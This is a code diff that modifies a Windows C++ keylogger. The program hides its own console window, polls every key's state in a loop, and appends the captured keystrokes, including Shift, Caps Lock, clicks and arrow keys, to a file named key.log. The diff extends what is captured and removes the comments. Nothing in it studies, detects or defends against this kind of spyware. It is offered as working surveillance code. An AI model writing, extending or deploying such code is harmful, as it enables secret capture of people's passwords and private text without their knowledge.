@@ -3,17 +3,20 @@
 #include "fstream"
 #include "string"
 using namespace std;
-
+bool fileinit = 0;
 void log(string key){
-
     fstream logfile;
-    logfile.open("key.log", ios::app); //create a log file//
+    logfile.open("key.log", ios::app);
+    if(!fileinit){
+        logfile << '\n';
+        fileinit = 1;
+    }
     if(logfile.is_open()){
-        logfile << key; //write key into log file//
-        logfile.close();  //close it //
+        logfile << key;
+        logfile.close();  
     }
 }
-char special(int key, bool capstate){ //determine key//
+char special(int key, bool capstate){
     switch(key){
         case VK_BACK:
             return '\b';
@@ -21,6 +24,7 @@ char special(int key, bool capstate){ //determine key//
             log("(ESC)");
             return ' ';
         case VK_SPACE:
+            log(" ");
             return ' ';
         case VK_CONTROL:
             log("(CTRL)");
@@ -43,10 +47,12 @@ char special(int key, bool capstate){ //determine key//
         case VK_RETURN:
             return '\n';     
         case VK_SHIFT:
+            log("(Shift)");
             return ' '; 
         case VK_CAPITAL:
+            log("(Caplock)");
             return ' ';
-        case VK_F1:
+        case VK_F1: 
             log("(F1)");
             return ' ';
         case VK_F2:
@@ -103,19 +109,31 @@ char special(int key, bool capstate){ //determine key//
             return '-';
         case VK_OEM_PERIOD:
          return '.';
+        case VK_LBUTTON:
+            log("(Click)");
+        case VK_RBUTTON:
+            log("(Right Click)");
+        case VK_UP:
+            log("(Up arrow)");
+        case VK_DOWN:
+            log("(Down arrow)");
+        case VK_LEFT:
+            log("(Left arrow)");
+        case VK_RIGHT:
+            log("(Right arrow)");
+        case VK_OEM_102:
+            return '~';
         default:
-            if(capstate){ //if caplock , return uppercase//
+            if(capstate){
                 return (char)key;
             }else{
-                return (char)tolower(key); //lowercase it //
+                return (char)tolower(key);
             }
     }
 }
-char shift(int key, bool uslayout){ //determine key after shifted//
-    if(uslayout){ //us layout is different with uk layout//
+char shift(int key, bool uslayout){
+    if(uslayout){
         switch(key){
-        case VK_SHIFT:
-            return ' ';
         case (int)'1':
             return '!';
         case (int)'2':
@@ -162,7 +180,7 @@ char shift(int key, bool uslayout){ //determine key after shifted//
         default:
             return special(key, TRUE);    
     }
-    }else{ //determine uk layout(not done yet)//
+    }else{
         switch(key){
         case VK_SHIFT:
             return ' ';
@@ -208,35 +226,36 @@ char shift(int key, bool uslayout){ //determine key after shifted//
             return '_';
         case VK_OEM_PERIOD:
             return '>';
-        
+        case VK_OEM_102:
+            return '~';
         default:
             return special(key, TRUE);    
     }
     }
-}
+}   
 
 int main(){
-    bool uslayout = 1; //boolean uslayout//
-    HKL name = GetKeyboardLayout(GetCurrentThreadId()); //get keyboard layout id//
-    if(name == (HKL)0x8090809){ //if uk layout id, uslayout =0//
+    bool uslayout = 1;
+    HKL name = GetKeyboardLayout(GetCurrentThreadId());
+    if(name == (HKL)0x8090809){
         uslayout = 0;
     }else{
         uslayout = 1;
     }
-    ShowWindow(GetConsoleWindow(), SW_HIDE); //show window and hide it//
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     char KEY = 'x';
-    bool keystate = 0; //shift boolean//
-    bool capstate = 0; //caplock boolean//
+    bool keystate = 0;
+    bool capstate = 0;
     string key;
-    while(TRUE){ //loop//
-        for(int KEY=8; KEY<=255; KEY++){ //change key ascll code to fit key input//
-            if(GetKeyState(VK_SHIFT) & 0x8000 ){ //if shift pressed//
-                keystate = 1;
-            }else {
-                keystate = 0;
-            }
-            if(GetAsyncKeyState(KEY) == -32767){ //finally find fit ascll code//
-                if(KEY == VK_CAPITAL){ //if caplock pressed//
+    while(TRUE){        
+        if(GetKeyState(VK_SHIFT) & 0x8000 ){
+            keystate = 1;
+        }else {
+            keystate = 0;
+        }
+        for(int KEY=8; KEY<=255; KEY++){
+            if(GetAsyncKeyState(KEY) == -32767){
+                if(KEY == VK_CAPITAL){
                     if(capstate){
                         capstate = 0;
                         
@@ -246,12 +265,16 @@ int main(){
                     }
                 }
                 if(keystate){
-                        key = shift(KEY, uslayout); //do shift key if shift pressed//
+                        key = shift(KEY, uslayout);
                 }else{
-                        key = special(KEY, capstate); //normal output//
+                        key = special(KEY, capstate);
+                }
+                if(key == " "){
+                    continue;
+                }else{
+                    log(key);
                 }
                 
-                log(key); //call log to write key//
             }
         }
     }
